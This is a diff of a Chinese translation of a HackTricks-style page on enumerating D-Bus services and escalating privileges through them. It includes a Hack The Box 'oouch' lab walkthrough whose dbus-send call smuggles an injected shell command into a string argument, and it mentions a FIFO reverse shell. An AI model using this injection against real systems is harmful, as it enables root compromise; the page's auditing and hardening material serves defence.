@@ -4,9 +4,9 @@
 
 ## **GUI enumeration**
 
-D-Bus 被用作 Ubuntu 桌面环境中的进程间通信 (IPC) 中介。在 Ubuntu 中，观察到多个消息总线的并发操作：系统总线，主要由 **特权服务用于暴露与系统相关的服务**，以及每个登录用户的会话总线，仅暴露与该特定用户相关的服务。这里的重点主要是系统总线，因为它与以更高特权（例如，root）运行的服务相关，我们的目标是提升特权。值得注意的是，D-Bus 的架构为每个会话总线采用了一个“路由器”，负责根据客户端为其希望与之通信的服务指定的地址，将客户端消息重定向到适当的服务。
+D-Bus 被用作 Ubuntu 桌面环境中的进程间通信 (IPC) 中介。在 Ubuntu 中，观察到多个消息总线的并发操作：系统总线，主要用于 **特权服务以暴露与系统相关的服务**，以及每个登录用户的会话总线，仅暴露与该特定用户相关的服务。这里的重点主要是系统总线，因为它与以更高特权（例如，root）运行的服务相关，我们的目标是提升特权。值得注意的是，D-Bus 的架构为每个会话总线采用了一个“路由器”，负责根据客户端为其希望与之通信的服务指定的地址，将客户端消息重定向到适当的服务。
 
-D-Bus 上的服务由它们暴露的 **对象** 和 **接口** 定义。对象可以类比于标准 OOP 语言中的类实例，每个实例通过 **对象路径** 唯一标识。该路径类似于文件系统路径，唯一标识服务暴露的每个对象。一个关键的研究接口是 **org.freedesktop.DBus.Introspectable** 接口，具有一个方法 Introspect。该方法返回对象支持的方法、信号和属性的 XML 表示，这里重点关注方法，省略属性和信号。
+D-Bus 上的服务由它们暴露的 **对象** 和 **接口** 定义。对象可以类比于标准 OOP 语言中的类实例，每个实例通过 **对象路径** 唯一标识。该路径类似于文件系统路径，唯一标识服务暴露的每个对象。一个关键的研究接口是 **org.freedesktop.DBus.Introspectable** 接口，具有一个方法 Introspect。该方法返回对象支持的方法、信号和属性的 XML 表示，这里重点关注方法，同时省略属性和信号。
 
 为了与 D-Bus 接口进行通信，使用了两个工具：一个名为 **gdbus** 的 CLI 工具，用于在脚本中轻松调用 D-Bus 暴露的方法，以及 [**D-Feet**](https://wiki.gnome.org/Apps/DFeet)，一个基于 Python 的 GUI 工具，旨在枚举每个总线上可用的服务并显示每个服务中包含的对象。
 ```bash
@@ -16,7 +16,7 @@ sudo apt-get install d-feet
 
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
-在第一张图片中，显示了与 D-Bus 系统总线注册的服务，特别是在选择系统总线按钮后突出显示了 **org.debin.apt**。D-Feet 查询此服务以获取对象，显示所选对象的接口、方法、属性和信号，如第二张图片所示。每个方法的签名也有详细说明。
+在第一张图片中，显示了注册到 D-Bus 系统总线的服务，特别是在选择系统总线按钮后突出显示了 **org.debin.apt**。D-Feet 查询此服务以获取对象，显示所选对象的接口、方法、属性和信号，如第二张图片所示。每个方法的签名也有详细说明。
 
 一个显著的特点是显示服务的 **进程 ID (pid)** 和 **命令行**，这对于确认服务是否以提升的权限运行非常有用，这对研究的相关性很重要。
 
@@ -24,7 +24,7 @@ sudo apt-get install d-feet
 
 但是，请注意 **某些方法需要身份验证**，才能允许我们调用它们。我们将忽略这些方法，因为我们的目标是首先在没有凭据的情况下提升我们的权限。
 
-还要注意，某些服务会查询另一个名为 org.freedeskto.PolicyKit1 的 D-Bus 服务，以确定用户是否被允许执行某些操作。
+还要注意，某些服务会查询另一个名为 org.freedeskto.PolicyKit1 的 D-Bus 服务，以确定用户是否应该被允许执行某些操作。
 
 ## **命令行枚举**
 
@@ -56,7 +56,7 @@ org.freedesktop.locale1                  - -               -                (act
 ```
 #### 连接
 
-[来自维基百科：](https://en.wikipedia.org/wiki/D-Bus) 当一个进程建立与总线的连接时，总线会为该连接分配一个称为 _唯一连接名称_ 的特殊总线名称。这种类型的总线名称是不可变的——只要连接存在，就保证它们不会改变——更重要的是，它们在总线的生命周期内不能被重用。这意味着对该总线的其他连接将永远不会分配这样的唯一连接名称，即使同一进程关闭与总线的连接并创建一个新的连接。唯一连接名称很容易识别，因为它们以——否则被禁止的——冒号字符开头。
+[来自维基百科：](https://en.wikipedia.org/wiki/D-Bus) 当一个进程建立与总线的连接时，总线会为该连接分配一个称为 _唯一连接名称_ 的特殊总线名称。这种类型的总线名称是不可变的——只要连接存在，就保证它们不会改变——更重要的是，它们在总线的生命周期内不能被重用。这意味着，即使同一个进程关闭与总线的连接并创建一个新的连接，也不会有其他连接被分配这样的唯一连接名称。唯一连接名称很容易识别，因为它们以——否则被禁止的——冒号字符开头。
 
 ### 服务对象信息
 
@@ -120,7 +120,7 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### List Interfaces of a Service Object
+### 列出服务对象的接口
 
 您需要拥有足够的权限。
 ```bash
@@ -132,7 +132,7 @@ busctl tree htb.oouch.Block #Get Interfaces of the service object
 ```
 ### Introspect Interface of a Service Object
 
-注意在这个例子中，选择了使用 `tree` 参数发现的最新接口（_见前一节_）：
+注意在这个例子中，选择了使用 `tree` 参数发现的最新接口（_见前一部分_）：
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -154,9 +154,9 @@ org.freedesktop.DBus.Properties     interface -         -            -
 
 ### 监控/捕获接口
 
-拥有足够的权限（仅有 `send_destination` 和 `receive_sender` 权限是不够的），你可以 **监控 D-Bus 通信**。
+拥有足够的权限（仅有 `send_destination` 和 `receive_sender` 权限是不够的）你可以 **监控 D-Bus 通信**。
 
-为了 **监控** 一次 **通信**，你需要是 **root**。如果你在成为 root 时仍然遇到问题，请查看 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 和 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+为了 **监控** 一次 **通信** 你需要是 **root**。如果你在成为 root 时仍然遇到问题，请查看 [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) 和 [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
 
 > [!WARNING]
 > 如果你知道如何配置 D-Bus 配置文件以 **允许非 root 用户嗅探** 通信，请 **联系我**！
@@ -186,7 +186,7 @@ MESSAGE "s" {
 STRING "Carried out :D";
 };
 ```
-您可以使用 `capture` 替代 `monitor` 将结果保存到 pcap 文件中。
+您可以使用 `capture` 代替 `monitor` 将结果保存到 pcap 文件中。
 
 #### 过滤所有噪音 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
@@ -194,7 +194,7 @@ STRING "Carried out :D";
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-可以指定多个规则。如果消息匹配_任何_规则，该消息将被打印。像这样：
+可以指定多个规则。如果消息匹配_任何_规则，消息将被打印。像这样：
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -206,11 +206,11 @@ dbus-monitor "type=method_call" "type=method_return" "type=error"
 
 ### 更多
 
-`busctl`还有更多选项，[**在这里找到所有选项**](https://www.freedesktop.org/software/systemd/man/busctl.html)。
+`busctl` 还有更多选项，[**在这里找到所有选项**](https://www.freedesktop.org/software/systemd/man/busctl.html)。
 
 ## **易受攻击的场景**
 
-作为用户**qtc 在主机 "oouch" 从 HTB**，您可以找到一个位于_/etc/dbus-1/system.d/htb.oouch.Block.conf_的**意外 D-Bus 配置文件**：
+作为用户 **qtc 在 HTB 的主机 "oouch" 内**，您可以找到一个位于 _/etc/dbus-1/system.d/htb.oouch.Block.conf_ 的 **意外 D-Bus 配置文件**：
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
@@ -262,13 +262,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-此外，在第57行中，您可以发现**为此D-Bus通信注册的唯一方法**称为`Block`（_**这就是为什么在接下来的部分中，负载将被发送到服务对象`htb.oouch.Block`、接口`/htb/oouch/Block`和方法名`Block`**_）：
+此外，在第57行中，您可以发现**为此D-Bus通信注册的唯一方法**称为`Block`（_**这就是为什么在接下来的部分中，负载将发送到服务对象`htb.oouch.Block`、接口`/htb/oouch/Block`和方法名`Block`**_）：
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-以下 Python 代码将通过 `block_iface.Block(runme)` 将有效负载发送到 D-Bus 连接的 `Block` 方法（_请注意，它是从前面的代码块中提取的_）：
+以下Python代码将通过`block_iface.Block(runme)`将有效负载发送到D-Bus连接的`Block`方法（_请注意，它是从前面的代码块中提取的_）：
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -282,12 +282,12 @@ bus.close()
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-- `dbus-send` 是一个用于向“消息总线”发送消息的工具
+- `dbus-send` 是一个用于向“消息总线”发送消息的工具。
 - 消息总线 – 一种软件，系统通过它使应用程序之间的通信变得简单。它与消息队列相关（消息按顺序排列），但在消息总线中，消息以订阅模型发送，并且速度非常快。
 - “-system” 标签用于表示这是一个系统消息，而不是会话消息（默认情况下）。
 - “–print-reply” 标签用于适当地打印我们的消息，并以人类可读的格式接收任何回复。
 - “–dest=Dbus-Interface-Block” Dbus 接口的地址。
-- “–string:” – 我们希望发送到接口的消息类型。发送消息有几种格式，如双精度、字节、布尔值、整数、对象路径。在这些中，“对象路径”在我们想要将文件路径发送到 Dbus 接口时非常有用。在这种情况下，我们可以使用一个特殊文件（FIFO）来以文件名的形式将命令传递给接口。“string:;” – 这是为了再次调用对象路径，我们放置 FIFO 反向 shell 文件/命令。
+- “–string:” – 我们希望发送到接口的消息类型。有几种发送消息的格式，如双精度、字节、布尔值、整数、对象路径。在这些中，“对象路径”在我们想要将文件路径发送到 Dbus 接口时非常有用。在这种情况下，我们可以使用一个特殊文件（FIFO）来以文件名的形式将命令传递给接口。“string:;” – 这是为了再次调用对象路径，我们放置 FIFO 反向 shell 文件/命令。
 
 _请注意，在 `htb.oouch.Block.Block` 中，第一部分（`htb.oouch.Block`）引用服务对象，最后一部分（`.Block`）引用方法名称。_
 
@@ -447,14 +447,14 @@ sudo dbus-map --dump-methods
 # 主动探测可以在没有 Polkit 提示的情况下访问的方法/属性
 sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
 ```
-* 该工具用 `!` 标记未受保护的知名名称，立即揭示您可以 *拥有*（接管）的服务或可以从非特权 shell 访问的方法调用。
+* 该工具用 `!` 标记未受保护的知名名称，立即揭示您可以 *拥有*（接管）或从非特权 shell 可达的方法调用的服务。
 
 ### uptux.py
 * 作者: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
 * 仅用 Python 编写的脚本，查找 systemd 单元中的 *可写* 路径 **和** 过于宽松的 D-Bus 策略文件（例如 `send_destination="*"`）。
 * 快速使用：
 ```bash
-python3 uptux.py -n          # 运行所有检查但不写日志文件
+python3 uptux.py -n          # 运行所有检查但不写入日志文件
 python3 uptux.py -d          # 启用详细调试输出
 ```
 * D-Bus 模块搜索以下目录，并突出显示任何可以被普通用户伪造或劫持的服务：
@@ -488,7 +488,7 @@ python3 uptux.py -d          # 启用详细调试输出
 ```bash
 grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
 ```
-* 对危险方法要求 Polkit – 即使是 *root* 代理也应将 *调用者* PID 传递给 `polkit_authority_check_authorization_sync()` 而不是他们自己的。
+* 对危险方法要求 Polkit – 即使 *root* 代理也应将 *调用者* PID 传递给 `polkit_authority_check_authorization_sync()` 而不是他们自己的。
 * 在长时间运行的助手中降低权限（在连接到总线后使用 `sd_pid_get_owner_uid()` 切换命名空间）。
 * 如果无法删除服务，至少将其 *范围* 限定为专用 Unix 组，并在其 XML 策略中限制访问。
 * 蓝队：使用 `busctl capture --output=/var/log/dbus_$(date +%F).pcap` 启用系统总线的持久捕获，并导入 Wireshark 进行异常检测。
